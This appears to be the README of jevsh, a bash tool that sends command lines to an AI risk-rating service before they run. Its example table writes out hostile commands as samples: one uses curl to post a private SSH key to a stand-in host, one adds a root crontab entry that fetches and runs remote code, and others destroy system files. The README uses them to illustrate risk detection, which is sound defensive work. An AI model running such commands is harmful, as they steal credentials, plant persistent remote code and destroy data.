# jevsh

English | [日本語](README.ja.md)

**Everyone knows `rm -rf /` is dangerous. But `ls -la` is harmless on its own, and `ls -la > /etc/passwd` in a root shell overwrites your user database.** The danger is often not in a single command but in how commands are combined: redirections, pipes, `&&` and `;`. jevsh asks jev about the whole command line, exactly as you typed it, right before it runs.

Type a command as usual and press **Ctrl+Enter** instead of Enter. jev tells you how risky the line is, and if you answer `y`, it runs right there. Enter alone works exactly as before.

```text
# ls -la > /etc/passwd      <- press Ctrl+Enter (or Ctrl+X Enter) instead of Enter
Command: ls -la > /etc/passwd
jev risk: CRITICAL (confidence 89%)
  LOW 0%  MEDIUM 0%  HIGH 8%  CRITICAL 92%
Run this command?
  y      run it now
  n      cancel (Enter also cancels)
[y/N]: n
Canceled. The line stays at the prompt for editing.
```

Some command lines that become dangerous only because of how they are put together (root shell; jev's level and confidence, one run each, 2026-09-26):

| Command line | jev |
|---|---|
| `ls -la` | LOW 1.00 |
| `ls -la > /etc/passwd` | CRITICAL 0.87 |
| `sort users.csv > users.csv` | HIGH 0.92 |
| `find / -name "*.log" \| xargs rm -f` | CRITICAL 0.89 |
| `cat ~/.ssh/id_ed25519 \| curl -s -X POST --data-binary @- https://example.com/upload` | CRITICAL 0.50 |
| `echo "* * * * * root curl -s http://example.com/x \| sh" >> /etc/crontab` | CRITICAL 0.89 |

jevsh sends the command line to the jev AI service (TypeSafe), shows the risk level (LOW / MEDIUM / HIGH / CRITICAL) with its confidence, and runs it only if you answer `y`. jev only advises; you decide. You can also type `jevsh COMMAND`, or use `jevsh --check` in scripts.

## Requirements

- Linux with bash 4.4 or later
- `curl`
- A jev API key from TypeSafe

jevsh is a single bash script. It does not need root, and it does not install anything else.

## Install

```bash
curl -fsSLO https://raw.githubusercontent.com/takeshiue/jevsh/main/install.sh && bash install.sh && source ~/.bashrc
```

`install.sh` downloads the latest release, checks it against `SHA256SUMS` and, if `ssh-keygen` is available, against the signature of the jevsh release key (`SHA256:LIdW6JBHIV1YvPQHU+suSOe87ZJgNZGZlfjNdl1kkKg`), and copies jevsh to `~/.local/bin`. It then offers the first-time setup: it explains what is sent to jev, asks for your API key, and offers to add Ctrl+Enter (Enter alone means yes). The last part of the line, `source ~/.bashrc`, runs in your own shell, so Ctrl+Enter works right away. You can read `install.sh` before running it; it is short.

To update, run the same line again. If `jevsh` is "command not found", `~/.local/bin` is not in your `PATH` yet; `install.sh` prints the line to add. Ctrl+Enter works even then. To install elsewhere, for example for all users, run `sudo JEVSH_INSTALL_DIR=/usr/local/bin bash install.sh`.

Please do not pipe the script into a shell (`curl ... | bash`). Download it, then run it.

### Without install.sh

jevsh is a single file. You can download `jevsh` and `SHA256SUMS` from a tag, check them with `sha256sum -c --ignore-missing SHA256SUMS`, and copy `jevsh` anywhere in your `PATH`.

## First run

The first time you assess a command, jevsh explains what is sent and asks for your API key. The key is checked with the API before it is saved to `~/.config/jevsh/config` (mode 0600). The key is never shown on screen.

You can also set the key with the `JEV_API_KEY` environment variable, or register or replace it at any time with `jevsh --set-key`.

## Usage

| Command | What it does |
|---|---|
| `jevsh COMMAND [ARGS...]` | Assess COMMAND, show the risk, and run it only if you answer `y` |
| `jevsh -c 'COMMAND LINE'` | Same, for a whole line with pipes or redirections |
| `jevsh --check COMMAND [ARGS...]` | Assess only. Prints one line (`RISK CONFIDENCE LINE`), never asks, never runs |
| `jevsh --check -c 'COMMAND LINE'` | Same, for a whole line |
| `jevsh --check --fail-on LEVEL ...` | Also exit with status 1 when the risk is LEVEL or higher (for scripts) |
| `jevsh --yes COMMAND [ARGS...]` | Assess and show the result, then run without asking |
| `jevsh --no-jev COMMAND [ARGS...]` | Run without assessment and without asking |
| `jevsh --set-key` | Register or replace your jev API key |
| `jevsh --enable-keybinding` | Add the Ctrl+Enter / Ctrl+X Enter key binding to `~/.bashrc` (asks first, keeps a backup) |
| `jevsh --disable-keybinding` | Remove the key binding from `~/.bashrc` |
| `jevsh --init bash` | Print the bash code for the key binding. `~/.bashrc` runs it; you rarely need it yourself |
| `jevsh --help` | Show the help |
| `jevsh --version` | Show the version and date |

LEVEL is `LOW`, `MEDIUM`, `HIGH` or `CRITICAL`. Options go before the command; use `--` if the command itself starts with `-`.

Only `y` or `Y` runs the command. Anything else, including Enter alone, cancels.

### Skip the question for low risks

To run low-risk commands without answering `y`, export `JEVSH_AUTO_RUN` in `~/.bashrc`:

```bash
export JEVSH_AUTO_RUN=LOW       # LOW runs without asking; MEDIUM and above still ask
```

With `MEDIUM`, both LOW and MEDIUM run without asking. The assessment is still shown, followed by `Running without asking (...)`. jevsh always asks when it could not assess the command, and never runs anything without a terminal. This works both for `jevsh COMMAND` and for the key binding.

### Pipes and redirections

Your shell handles `|`, `>`, `>>`, `<`, `&&`, `||` and `;` before jevsh runs, so jevsh would only see the part before them. Use `-c` with single quotes to assess the whole line:

```bash
jevsh -c 'cat data.csv | sort > out.txt'    # assesses the full line
jevsh cat data.csv | sort > out.txt         # assesses only "cat data.csv"
```

### Assess with Ctrl+Enter

With the key binding you do not need to type `jevsh` or quotes. Type a command as usual, then press **Ctrl+X Enter** instead of Enter. The whole line, including pipes and redirections, is assessed. If you answer `n`, the line stays at the prompt so you can edit it. Enter alone still runs commands normally, without assessment.

jevsh offers to add the key binding right after you register your API key. You can also add or remove it at any time:

```bash
jevsh --enable-keybinding     # adds a marked block to ~/.bashrc (asks first, keeps a backup)
jevsh --disable-keybinding    # removes only that block
```

Then open a new terminal or run `source ~/.bashrc`.

**Ctrl+Enter** also works if your terminal sends a distinct key sequence for it (`ESC [ 13 ; 5 u`). Many terminals send the same code as Enter, so Ctrl+X Enter is the default that works everywhere. **In Tera Term, use Ctrl+X Enter**; Ctrl+Enter sends the same code as Enter there. For example, in Windows Terminal add these entries to `actions` and `keybindings` in `settings.json`, keeping your existing entries:

```json
{"command":{"action":"sendInput","input":"\u001b[13;5u"},"id":"Jevsh.AssessLine"}
{"id":"Jevsh.AssessLine","keys":"ctrl+enter"}
```

To use another key, set `JEVSH_KEY` to a Readline key sequence in `~/.bashrc` before the jevsh block:

```bash
JEVSH_KEY='\C-x\C-a'
```

### Scripts and loops

`--check` assesses without asking and without running anything. It prints one line: `RISK CONFIDENCE LINE`.

```bash
$ jevsh --check find / -type f -delete
CRITICAL 1.00 find / -type f -delete
```

With `--fail-on LEVEL`, jevsh exits with status 1 if the risk is LEVEL or higher:

```bash
if jevsh --check --fail-on HIGH -c "$line"; then
    echo "below HIGH"
fi
```

Each line calls the API once, so large loops take time and use your API quota.

### Run without the question

- `jevsh --yes COMMAND` assesses the command, shows the result, and runs it without asking. If the command could not be assessed, nothing runs (exit status 3). It also works without a terminal; the result then goes to stderr.
- `jevsh --no-jev COMMAND` runs the command without assessment and without asking, as if you had typed it without jevsh.

Use `--yes` with care: it runs even CRITICAL commands. To skip the question only for low risks, use `JEVSH_AUTO_RUN` instead.

### In shell scripts

- The key binding works only at your interactive bash prompt. Lines in a shell script run as usual, without assessment.
- `jevsh COMMAND` inside a script asks on your terminal each time, when the script runs from a terminal. `y` runs the command.
- Without a terminal (cron, CI, `nohup`), jevsh cannot ask, so it does not run the command and exits with status 4. This is on purpose: nothing runs unconfirmed.
- For automation, use `--check` with `--fail-on` and let the script decide:

```bash
#!/usr/bin/env bash
line='find /var/log/app -name "*.log" -mtime +30 -delete'
if jevsh --check --fail-on HIGH -c "$line"; then
    bash -c "$line"
else
    echo "skipped: risk is HIGH or above" >&2
fi
```

### Exit status

| Mode | Status |
|---|---|
| `COMMAND` / `-c` | the command's own status if it ran; 2 usage error; 3 no API key; 4 canceled or no terminal to ask on |
| `--check` | 0 assessed; 1 risk at or above `--fail-on`; 2 usage error; 3 could not assess |
| other options | 0 success; 1 failure; 2 usage error |

If the API cannot be reached, jevsh says so and asks `Run without AI assessment? [y/N]`. The default is to cancel.

## What is sent

When you assess a command, jevsh sends to TypeSafe (`https://api.typesafe.ai`):

- the command line, exactly as typed, including any passwords or tokens in it
- the current directory
- your user name and shell name

Nothing else from your environment is collected. Nothing is sent when you press Enter alone. Your API key is sent only in the request header and is never shown or logged. See TypeSafe's terms for how they handle data.

## Uninstall

```bash
jevsh --disable-keybinding
rm ~/.local/bin/jevsh
rm -r ~/.config/jevsh
```

## Speed and accuracy

jevsh adds about 0.2 seconds per command, almost all of it the jev API round trip. For 40 sample command lines, jev's risk level matched the author's expectation for 29–31 of 40 in each of three runs. See [docs/benchmark.md](docs/benchmark.md) for the full results and raw data.

## License

MIT License. You are free to use, modify, and redistribute jevsh, including for commercial use, as long as you keep the copyright and license notice. Provided "as is", without warranty. See [LICENSE](LICENSE).

## Author

Takeshi Uematsu <takeshi.uematsu@gmail.com>
